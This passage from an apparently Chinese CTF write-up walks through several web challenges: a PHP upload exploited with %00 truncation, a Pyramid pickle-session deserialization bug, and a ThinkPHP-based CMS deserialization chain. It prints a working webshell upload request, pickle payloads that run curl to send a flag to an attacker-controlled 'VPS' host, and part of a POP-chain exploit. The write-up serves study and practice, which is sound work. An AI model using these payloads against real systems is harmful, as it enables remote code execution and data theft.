 （有点区别这个）
应该都差不多。
关键代码在 `qbl.php`
这里的 `$type` 是从 post 参数里的 `image/(\w+)` 来的，但是限制了只能是 `bmp` 或者 `png`，绕不过也不可控。
再看 `$new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type;` 这句，这个 `$id` 从 GET
参数来的，是可控的。
但是为了上传使得后缀名为 `.php`，那就需要 **搭配`%00` 截断**。
~~试了老半天发现还不行最后发现漏看了个`trim`（别骂了别骂了~~
由于这个 `trim` 函数会把字符串首尾的空字符给去除，于是就得加个其他的字符包裹一下 `%00`.
构造 id 为 `miao.php%00.`，上传的文件内容是 base64 encode + urlencode 后的一句话木马。
**payload:**
    POST /qbl.php?id=miao.php%00.&url=http://baidu.com HTTP/1.1
    Host: node4.buuoj.cn:28820
    Content-Length: 72
    Pragma: no-cache
    Cache-Control: no-cache
    Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
    Sec-Ch-Ua-Mobile: ?0
    Upgrade-Insecure-Requests: 1
    Origin: https://node4.buuoj.cn:28820
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Dest: document
    Referer: https://node4.buuoj.cn:28820/sc.php?id=miao&url=http://baidu.com
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    img=data%3aimage/png%3bbase64,PD9waHAgQGV2YWwoJF9SRVFVRVNUWydtJ10pOz8%2b
> **Extensive reading:**
>
> [挖洞姿势 | 深度聊聊PHP下的“截断”问题](https://www.freebuf.com/articles/web/179401.html)
>
>
> [过气的00截断](https://skysec.top/2017/09/06/%E8%BF%87%E6%B0%94%E7%9A%8400%E6%88%AA%E6%96%AD/)
>
> `%00` 截断的利用条件：
>
>   1. php版本小于5.3.4
>   2. php的magic_quotes_gpc为OFF状态
>
###  cybercms
> 赛博CMS，只为安全而生
>
> Hint: 信息搜集是一个web手必备的技能
**详见另一篇博客：**
[CTF | 2021 DASCTF July cybercms
一探再探](https://miaotony.xyz/2021/08/10/CTF_2021DASCTF_July_cybercms/) 或者
[这里](https://www.anquanke.com/post/id/250048)
###  easyweb
题目给了 dockerfile 及后端源码。
`app.py`
    from hypercorn.middleware import DispatcherMiddleware
    from vuln_app import vuln_app
    from simple_app import simple_app
    dispatcher_app = DispatcherMiddleware({
        "/vuln": vuln_app,
        "/": simple_app,
    })
    if __name__ == '__main__':
        a = 1
`simple_app.py`
    from a2wsgi import WSGIMiddleware
    def application(env, start_response):
        start_response('200 OK', [('Content-Type','text/html')])
        return [b"Hello World"]
    simple_app = WSGIMiddleware(application)
`vuln_app.py`
    from wsgiref.simple_server import make_server
    from pyramid.config import Configurator
    from pyramid.response import Response
    from pyramid.renderers import render_to_response
    from pyramid.session import SignedCookieSessionFactory, PickleSerializer
    from webob.cookies import Base64Serializer
    from a2wsgi import WSGIMiddleware
    my_session_factory = SignedCookieSessionFactory("233333333333", serializer=Base64Serializer(PickleSerializer()))
    def hello_world(request):
        request.session["233"] = "2333"
        return Response('Hello World!')
    vuln_app = None
    with Configurator() as config:
        config.set_session_factory(my_session_factory)
        config.add_route('hello', '/')
        config.add_view(hello_world, route_name='hello')
        vuln_app  = WSGIMiddleware(config.make_wsgi_app())
    if __name__ == '__main__':
        with Configurator() as config:
            config.set_session_factory(my_session_factory)
            config.add_route('hello', '/')
            config.add_view(hello_world, route_name='hello')
            app = config.make_wsgi_app()
        server = make_server('0.0.0.0', 6543, app)
        server.serve_forever()
`dockerfile`
    FROM ubuntu:18.04
    ENV DEBIAN_FRONTEND=noninteractive
    RUN sed -i "s/archive.ubuntu.com/mirrors.aliyun.com/g" /etc/apt/sources.list && apt update && apt dist-upgrade -y
    RUN apt install -y software-properties-common && add-apt-repository ppa:deadsnakes/ppa && apt install python3.8 -y
    RUN apt install  nginx  python3-pip curl  -y
    ADD nginx.conf  /etc/nginx/sites-available/default
    COPY conf/* /root/
    WORKDIR /root
    ADD flag /flag
    RUN chmod 600 /flag
    ADD readflag.c /readflag.c
    RUN apt -y install gcc && \
        gcc /readflag.c -o /readflag && \
        chmod +s /readflag
    COPY app  /app
    WORKDIR /app
    RUN  mv /usr/bin/python3.8 /usr/bin/python3 && python3 -m pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
    # CMD python3 -m http.server
    CMD nginx && useradd ctf && su ctf -c 'hypercorn  --bind 0.0.0.0:4488   app:dispatcher_app' && tail -f /dev/null
flag 要通过执行 `/readflag` 来获得。
`app.py` 里注册了两个路由，根目录访问的是 `simple_app`，看上去没啥问题，主要还是 `/vuln` 下访问的
`vuln_app`，其中用到了 `PickleSerializer`，盲猜就有 pickle 序列化在里面了。
直接打上断点，跟一波 debug，成功发现了 `pickle.loads`。在设置 session 时先从请求获取 session，而后再设置新的
session。
从 cookie 里取出 session，进行 urlsafe_b64decode，再截取出 `cstruct` 和签名
`expected_sig`，进行校验后对 `cstruct` 再一次 urlsafe_b64decode，最后调用 `pickle.loads`。
设置 cookie 的操作在 `Response` 时进行，最终会调用上图的 `pickle.dumps`。
做题的话，可以直接改最后这个 `pickle.dumps` 结果为构造好的 pickle payload。
可以参考 [2021 巅峰极客网络安全技能挑战赛 opcode
一题](https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#opcode)，比如
    b"(cos\nsystem\nS\'curl http://VPS:PORT/?flag=`/readflag`\'\no."
    # or
    b'cposix\nsystem\nX3\x00\x00\x00curl http://VPS:PORT/`readflag | base64`\x85R.'
然后本地起服务，浏览器里请求一下，把 cookie 复制一下，把这个作为 payload 赋值给远程的 cookie 就完事了。
访问
[http://xxxxxxxxx/vuln，修改](http://xxxxxxxxx/vuln%EF%BC%8C%E4%BF%AE%E6%94%B9)
cookie，刷新页面，vps 上起个 web 服务监听，拿到 flag 完事。
* * *
或者参考大师傅更方便的方法，可以直接改后端代码，直接设置个新的 session 实例化一个 RCE 对象。
    class Miao(object):
        def __reduce__(self):
            import os
            return os.system, ("curl http://VPS/?flag=`/readflag`",)
    def hello_world(request):
        request.session["233"] = "2333"
        request.session["miao"] = Miao()
        print(request.session)
        return Response('Hello World!')
本地调试可以发现第一次访问会设置上 session，第二次访问的时候就会反序列化 pickle 执行 payload 了。
本地起个原始的 app，改好 cookie，刷新页面就能打通了。
嗯很好，远程没打通！
重试了几次，还是没成功……
最后寻思着是不是那个 pickle 序列化时候和操作系统有关啊？
换到 kali 下起 web 服务，生成 payload 再扔到远程去，这回成功了……
###  ez_website
> 简单的题目
>
> 
给了源码，齐博X1.0，基于ThinkPHP V5.0.18 二次开发的。
后台弱密码 admin/admin888
不过后台上传貌似不行，sql 执行开启了 `--secure-file-priv`，不能写入文件。
**打法1 前台反序列化 RCE**
这里复现，主要参考 [齐博建站系统x1.0代码审计](https://ma4ter.cn/2527.html)
有一处前台反序列化的地方 `application\index\controller\Labelmodels.php`
直接拿文章里面的现成 exp 来打了。
    files = [$files]; //$file => /think/Model的子类new Pivot(); Model是抽象类
            }
        }
    }
    namespace think {
        abstract class Model{
            protected $append = [];
            protected $error = null;
            public $parent;
            function __construct($output, $modelRelation)
            {
                $this->parent = $output;  //$this->parent=> think\console\Output;
                $this->append = array("xxx"=>"getError");     //调用getError 返回this->error
                $this->error = $modelRelation;               // $this->error 要为 relation类的子类，并且也是OnetoOne类的子类==>>HasOne
            }
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model{
            function __construct($output, $modelRelation)
            {
                parent::__construct($output, $modelRelation);
            }
        }
    }
    namespace think\model\relation{
        class HasOne extends OneToOne {
        }
    }